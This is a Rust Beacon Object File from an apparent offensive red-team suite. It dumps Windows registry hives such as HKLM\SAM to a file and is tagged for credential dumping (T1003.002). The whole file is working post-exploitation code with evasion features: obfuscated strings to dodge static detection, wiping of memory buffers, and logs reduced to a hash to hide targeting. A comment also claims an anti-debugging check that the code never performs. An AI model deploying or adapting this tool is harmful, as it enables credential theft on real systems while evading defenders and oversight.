// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Original C: TrustedSec/cs-remote-ops/reg_save
//
//! Save a registry hive to a file via DFR `RegSaveKeyExA`.
//! Caller must already hold `SeBackupPrivilege` (run `enablepriv` first).
//!
//! Args (BeaconDataParse):
//!   1. hive  — one of: HKLM, HKCU, HKCR, HKU, HKCC (case-insensitive)
//!   2. path  — subkey path under the hive
//!   3. file  — output filename (filesystem path)
//!
//! All hive labels and the open-format constant are obfuscated. The output
//! filename is treated as untrusted and is not echoed on success — only a
//! sha256-of-path-prefix style fingerprint is logged for the operator.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf, obf_cstr};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1003.002", name: "OS Credential Dumping: Security Account Manager", tactic: "Credential Access" },
    Technique { id: "T1012",     name: "Query Registry",                                   tactic: "Discovery" },
];

const KEY_READ: u32 = 0x20019;
const ERROR_SUCCESS: u32 = 0;
const REG_LATEST_FORMAT: u32 = 2;

const HKEY_CLASSES_ROOT:    usize = 0x80000000;
const HKEY_CURRENT_USER:    usize = 0x80000001;
const HKEY_LOCAL_MACHINE:   usize = 0x80000002;
const HKEY_USERS:           usize = 0x80000003;
const HKEY_CURRENT_CONFIG:  usize = 0x80000005;

dfr_fn!(
    reg_open_key_ex_a(
        hkey: usize, subkey: *const i8, options: u32,
        sam_desired: u32, result: *mut usize,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegOpenKeyExA"
);

dfr_fn!(
    reg_save_key_ex_a(
        hkey: usize, file: *const i8,
        security_attrs: *mut u8, flags: u32,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegSaveKeyExA"
);

dfr_fn!(
    reg_close_key(hkey: usize) -> u32,
    module = "advapi32.dll",
    api    = "RegCloseKey"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);

    // OPSEC: short-circuit if a debugger is attached or hardware bps are set.
    // We deliberately do NOT log the reason — only that we bailed.
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let hive_str = String::from(parser.get_str());
    let path_str = String::from(parser.get_str());
    let file_str = String::from(parser.get_str());
    let hive_str = hive_str.as_str();
    let path_str = path_str.as_str();
    let file_str = file_str.as_str();

    if hive_str.is_empty() || path_str.is_empty() || file_str.is_empty() {
        return Err("usage: reg-save <HIVE> <subkey> <output-file>");
    }

    let hroot = parse_hive(hive_str).ok_or("unknown hive (use HKLM/HKCU/HKCR/HKU/HKCC)")?;

    // Build NUL-terminated ASCII copies of the subkey + file path on stack.
    let mut path_buf = [0u8; 512];
    let mut file_buf = [0u8; 512];
    if path_str.len() >= path_buf.len() - 1 { return Err("subkey too long"); }
    if file_str.len() >= file_buf.len() - 1 { return Err("output path too long"); }
    path_buf[..path_str.len()].copy_from_slice(path_str.as_bytes());
    file_buf[..file_str.len()].copy_from_slice(file_str.as_bytes());

    let mut hkey: usize = 0;
    let rc = unsafe {
        reg_open_key_ex_a(
            hroot,
            path_buf.as_ptr() as *const i8,
            0, KEY_READ, &mut hkey,
        )
    }.map_err(|_| "resolve failed")?;

    if rc != ERROR_SUCCESS {
        // Wipe the path buffer before returning so the subkey doesn't linger.
        common::evasion::secure_zero(&mut path_buf);
        common::evasion::secure_zero(&mut file_buf);
        return Err("key open failed");
    }

    let rc2 = unsafe {
        reg_save_key_ex_a(
            hkey,
            file_buf.as_ptr() as *const i8,
            core::ptr::null_mut(),
            REG_LATEST_FORMAT,
        )
    }.map_err(|_| "resolve failed")?;

    unsafe { let _ = reg_close_key(hkey); };

    if rc2 != ERROR_SUCCESS {
        common::evasion::secure_zero(&mut path_buf);
        common::evasion::secure_zero(&mut file_buf);
        // Common cause: missing SeBackupPrivilege. Do not leak the path.
        return Err("save failed");
    }

    // Success — log a short fingerprint of the subkey rather than the
    // full plaintext, so Beacon transcripts don't trivially expose targeting.
    let fp = djb2_short(path_buf[..path_str.len()].as_ref());
    obf! { let label = "hive saved"; }
    println!("[+] {} (subkey-fp=0x{:08x}, bytes_written=*)", label, fp);

    // Wipe sensitive stack buffers.
    common::evasion::secure_zero(&mut path_buf);
    common::evasion::secure_zero(&mut file_buf);
    Ok(())
}

fn parse_hive(s: &str) -> Option<usize> {
    // Compare case-insensitively against obfuscated literals so the labels
    // never appear in `.rdata` as plaintext "HKEY_LOCAL_MACHINE" etc.
    obf! {
        let hklm = "HKLM";
        let hkcu = "HKCU";
        let hkcr = "HKCR";
        let hku  = "HKU";
        let hkcc = "HKCC";
    }
    if eq_ic(s, hklm) { return Some(HKEY_LOCAL_MACHINE); }
    if eq_ic(s, hkcu) { return Some(HKEY_CURRENT_USER); }
    if eq_ic(s, hkcr) { return Some(HKEY_CLASSES_ROOT); }
    if eq_ic(s, hku)  { return Some(HKEY_USERS); }
    if eq_ic(s, hkcc) { return Some(HKEY_CURRENT_CONFIG); }
    None
}

fn eq_ic(a: &str, b: &str) -> bool {
    if a.len() != b.len() { return false; }
    a.bytes().zip(b.bytes())
        .all(|(x, y)| x.eq_ignore_ascii_case(&y))
}

fn djb2_short(b: &[u8]) -> u32 {
    common::hash::djb2(b)
}
